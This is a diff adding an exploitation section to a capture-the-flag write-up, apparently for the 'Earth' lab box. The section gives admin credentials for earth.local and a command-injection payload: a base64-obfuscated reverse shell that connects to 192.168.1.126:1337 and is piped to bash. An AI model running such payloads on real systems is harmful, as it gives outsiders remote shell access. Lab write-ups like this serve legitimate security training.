@@ -183,4 +183,14 @@ earth.local/admin credentials: `terra:earthclimatechangebad4humans`
 
 ## Exploitation
 
-### Name of the technique
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+* Tried simply placing a bash shell but it would not accept outbound connections
+* This means some sort of filtering is occuring
+* Let's use a trick we remembered from an OSCP box to URL code the reverse shell locally and reproduce it on the server end
+
+### Command Injection on earth.local/admin/
+
+```
+echo -e 'L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTI2LzEzMzcgMD4mMQo=' | base64 -d | bash
+```
